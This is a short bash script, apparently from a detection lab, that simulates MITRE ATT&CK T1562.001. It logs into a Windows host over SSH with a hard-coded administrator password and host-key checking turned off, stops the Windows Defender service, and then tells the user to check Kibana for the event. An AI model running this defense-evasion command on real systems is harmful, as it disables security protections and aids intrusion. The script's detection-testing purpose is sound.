#!/bin/bash
# Attack Simulation: Defense Evasion - Disable Windows Defender
# MITRE ATT&CK: T1562.001
# Usage: ./defense_evasion.sh
# Requirements: SSH access to WS01

TARGET_IP="192.168.56.11"
WIN_USER="Administrator"
WIN_PASS="YourPassword123!"

echo "[*] Disabling Windows Defender on $TARGET_IP"
sshpass -p "$WIN_PASS" ssh -o StrictHostKeyChecking=no ${WIN_USER}@${TARGET_IP} \
    "powershell -Command \"Stop-Service -Name 'WinDefend' -Force\""

echo "[*] Attack complete - check Kibana for Event ID 7036 with Defender service stopped"
